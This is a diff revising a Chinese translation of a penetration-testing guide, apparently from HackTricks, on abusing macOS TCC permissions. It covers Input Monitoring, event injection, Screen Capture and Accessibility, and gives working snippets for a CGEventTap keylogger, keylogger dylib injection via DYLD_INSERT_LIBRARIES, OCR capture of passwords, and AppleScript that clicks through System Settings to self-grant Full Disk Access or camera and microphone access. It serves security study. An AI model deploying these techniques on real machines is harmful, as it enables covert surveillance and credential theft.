@@ -1,31 +1,31 @@
-# macOS 输入监视、屏幕捕获与辅助功能滥用
+# macOS Input Monitoring、Screen Capture 与 Accessibility Abuse
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## 概述
 
-三个相关的 TCC 服务控制应用如何观察并与用户的桌面会话交互：
+三个相关的 TCC service 控制 applications 如何观察和交互用户的 desktop session：
 
 | TCC Service | Permission | Capability |
 |---|---|---|
-| `kTCCServiceListenEvent` | **输入监视** | 读取整个系统的所有键盘和鼠标事件（keylogging） |
-| `kTCCServicePostEvent` | **输入注入** | 注入合成的键盘和鼠标事件 |
-| `kTCCServiceScreenCapture` | **屏幕捕获** | 读取显示缓冲区、截屏、录制屏幕 |
-| `kTCCServiceAccessibility` | **辅助功能** | 通过 AXUIElement API 控制其他应用，读取 UI 元素 |
+| `kTCCServiceListenEvent` | **Input Monitoring** | 在整个 system-wide 读取所有 keyboard 和 mouse events（keylogging） |
+| `kTCCServicePostEvent` | **Input Injection** | 注入 synthetic keyboard 和 mouse events |
+| `kTCCServiceScreenCapture` | **Screen Capture** | 读取 display buffer、take screenshots、record screen |
+| `kTCCServiceAccessibility` | **Accessibility** | 通过 AXUIElement API 控制其他 applications，读取 UI elements |
 
-这些权限在 macOS 上是**最危险的组合** —— 共同提供：
-- 完整记录每次按键（密码、消息、信用卡）
-- 录制所有可见内容
-- 合成输入注入（点击按钮、批准对话框）
-- 等同于物理访问的完整 GUI 控制
+这些 permissions 是 macOS 上**最危险的组合**——结合起来可以提供：
+- 对每次 keystroke 进行完整 keylogging（passwords、messages、credit cards）
+- 记录所有可见内容的 screen
+- synthetic input injection（click buttons、approve dialogs）
+- 等同于 physical access 的完整 GUI control
 
 ---
 
-## Input Monitoring (kTCCServiceListenEvent)
+## Input Monitoring（kTCCServiceListenEvent）
 
 ### 工作原理
 
-macOS 使用 **`CGEventTap` API** 允许进程从 Quartz 事件系统拦截输入事件。具有 ListenEvent 权限的进程可以创建一个事件 tap，从而在事件到达目标应用之前或之后接收 **每一个键盘和鼠标事件**。
+macOS 使用 **`CGEventTap` API**，允许 processes 从 Quartz event system 中 intercept input events。拥有 ListenEvent permission 的 process 可以创建 event tap，在每个 keyboard 和 mouse event 到达目标 application 之前或之后接收它们。<sup>[1]</sup>
 ```objc
 // Create an event tap that captures all key-down events
 CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
@@ -49,7 +49,7 @@ CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
 return event;
 }
 ```
-### 查找带有 entitlements 的二进制文件
+### 查找具有 Entitlements 的二进制文件
 ```bash
 # Find processes with input monitoring TCC grants
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
@@ -59,9 +59,9 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
 ```
-### 攻击: Keylogging via Code Injection
+### Attack: 通过 Code Injection 进行 Keylogging
 
-如果一个具有 ListenEvent permission 的二进制文件同时具有 **disabled library validation** 或 **allows DYLD environment variables**，攻击者可以注入一个 dylib 来注册一个 CGEventTap:
+如果某个 binary 具有 ListenEvent permission，同时还**禁用了 library validation**或**允许 DYLD environment variables**，攻击者就可以注入一个注册 CGEventTap 的 dylib：
 ```bash
 # Check if the target allows code injection
 codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
@@ -70,11 +70,11 @@ grep -E "allow-dyld|disable-library-validation"
 # If both are present, inject a keylogger dylib:
 DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
 ```
-被注入的 dylib 继承了目标的 ListenEvent TCC 授权并捕获所有按键。
+注入的 dylib 继承目标的 ListenEvent TCC 授权，并捕获所有按键。
 
 ### 攻击：Credential Harvesting
 
-一个复杂的 keylogger 可以将按键与当前活动的应用程序相关联：
+复杂的 keylogger 可以将按键与当前活动应用程序关联起来：
 ```objc
 // Get the frontmost application to contextualize keystrokes
 NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
@@ -85,11 +85,11 @@ NSString *appName = frontApp.localizedName;
 ```
 ---
 
-## 输入注入 (kTCCServicePostEvent)
+## Input Injection (kTCCServicePostEvent)
 
 ### 工作原理
 
-PostEvent 权限允许创建一个带有 **`kCGEventTapOptionDefault`**（可修改/注入事件）的 event tap，而不是 ListenOnly。这样可以：
+PostEvent permission 允许使用 **`kCGEventTapOptionDefault`**（可以修改/注入 events）创建 event tap，而不是 ListenOnly。<sup>[1]</sup>这使得以下操作成为可能：
 ```objc
 // Inject a keystroke
 CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
@@ -103,9 +103,9 @@ CGPointMake(100, 200),
 kCGMouseButtonLeft);
 CGEventPost(kCGSessionEventTap, click);
 ```
-### 攻击: 自动化 TCC 提示批准
+### 攻击：自动批准 TCC 提示
 
-使用 PostEvent，攻击者可以在 TCC 权限对话框上**模拟点击 "Allow"**：
+使用 PostEvent，攻击者可以**模拟点击 TCC 权限对话框中的“允许”**：
 ```bash
 # Using cliclick (if available) or direct CGEvent injection:
 # 1. Trigger a TCC prompt for the malware
@@ -119,9 +119,9 @@ CGEventPost(kCGSessionEventTap, click);
 
 ### 工作原理
 
-屏幕捕获权限允许使用以下方法读取显示缓冲区：
-- **`CGWindowListCreateImage`** — 捕获任意窗口或全屏
-- **`ScreenCaptureKit`** (macOS 12.3+) — 用于流式传输屏幕内容的现代 API
+屏幕捕获权限允许通过以下方式读取显示缓冲区：
+- **`CGWindowListCreateImage`** — 捕获任意窗口或整个屏幕
+- **`ScreenCaptureKit`** (macOS 12.3+) — 用于流式传输屏幕内容的现代 API<sup>[3]</sup>
 - **`CGDisplayStream`** — 硬件加速的屏幕捕获
 ```objc
 // Capture the entire main display
@@ -143,9 +143,9 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 sqlite3 /tmp/executables.db "
 SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
 ```
-### 攻击: Credential Capture via OCR
+### 攻击：通过 OCR 捕获凭据
 
-注入的屏幕捕获进程可以定期捕获帧并使用 OCR 提取密码：
+注入的 screen capture 进程可以定期捕获画面，并使用 OCR 提取密码：
 ```bash
 # Basic screen capture from a process with the TCC grant
 screencapture -x /tmp/screen.png
@@ -154,11 +154,11 @@ screencapture -x /tmp/screen.png
 screencapture -x -l <windowID> /tmp/window.png
 ```
 > [!WARNING]
-> 从 **macOS Sonoma** 开始，screen capture 会在 menu bar 中显示一个 **persistent indicator**。在旧版本中，screen recording 可能完全不会有任何提示。然而，短暂的 single-frame capture 仍可能被用户忽略。
+> 从 **macOS Sonoma** 开始，屏幕捕获会在菜单栏中显示一个**持久指示器**。在较旧版本中，屏幕录制可能完全静默。不过，短暂的单帧捕获仍可能不会被用户察觉。
 
-### 攻击: Session Recording
+### Attack: Session Recording
 
-Continuous screen recording 提供了用户会话的完整回放：
+持续的屏幕录制可完整重放用户的会话：
 ```objc
 // Using ScreenCaptureKit for streaming capture (macOS 12.3+)
 // This captures frames continuously with minimal CPU impact
@@ -170,16 +170,16 @@ config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
 ```
 ---
 
-## 辅助功能 (kTCCServiceAccessibility)
+## 辅助功能（kTCCServiceAccessibility）
 
 ### 工作原理
 
-辅助功能访问通过 **AXUIElement API** 授予对其他应用程序的控制。具有辅助功能权限的进程可以：
+辅助功能访问权限通过 **AXUIElement API** 授予对其他应用程序的控制权。<sup>[2]</sup>拥有辅助功能权限的进程可以：
 
-1. **读取**任何应用程序中的任何 UI 元素（文本字段、标签、按钮、菜单）
+1. **读取**任何应用程序中的 UI 元素（文本字段、标签、按钮、菜单）
 2. **点击**按钮并与控件交互
-3. **输入**文本到任何文本字段
-4. **导航**菜单和对话框
+3. **输入**文本到任何文本字段中
+4. **浏览**菜单和对话框
 5. **抓取**任何正在运行的应用程序中显示的数据
 ```objc
 // Get the frontmost application
@@ -195,9 +195,9 @@ CFTypeRef value;
 AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
 // value contains whatever text is displayed in the field
 ```
-### 攻击：Self-Granting TCC Permissions
+### 攻击：自行授予 TCC 权限
 
-最危险的可访问性滥用是 **在 System Settings 中导航以授予自身 malware 额外权限**：
+最危险的辅助功能滥用方式是**导航 System Settings，为自己的 malware 授予额外权限**：
 ```bash
 # Using osascript with accessibility access:
 # Navigate to Privacy & Security > Full Disk Access
@@ -214,7 +214,7 @@ tell process "System Settings"
 end tell
 end tell'
 ```
-### 攻击：Cross-Application Data Scraping
+### 攻击：跨应用数据抓取
 ```bash
 # Read data from any application's UI
 osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'
@@ -243,7 +243,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 
 ## 攻击链
 
-### 链：Input Monitoring + Screen Capture = 全面监控
+### 攻击链：Input Monitoring + Screen Capture = 完整监控
 ```
 1. Inject into binary with ListenEvent + ScreenCapture
 2. CGEventTap captures all keystrokes
@@ -251,7 +251,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 4. Correlate: keystroke timing + active window + screen content
 5. Result: passwords, private messages, financial data
 ```
-### 链: Accessibility + PostEvent = 完全远程控制
+### Chain: Accessibility + PostEvent = 完全远程控制
 ```
 1. Inject into binary with Accessibility + PostEvent
 2. Use AXUIElement to read current screen state
@@ -260,7 +260,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 5. Open Terminal, type commands as if the user did it
 6. Result: equivalent to physical keyboard/mouse access
 ```
-### 链：Accessibility → Self-Grant Camera/Mic → 监控
+### 链：Accessibility → Self-Grant Camera/Mic → Surveillance
 ```
 1. Start with only Accessibility permission
 2. Open System Settings > Privacy & Security > Camera
@@ -292,9 +292,9 @@ AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
 ```
 ## 参考资料
 
-* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
-* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
-* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
-* [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)
+- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
+- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
+- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
+- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
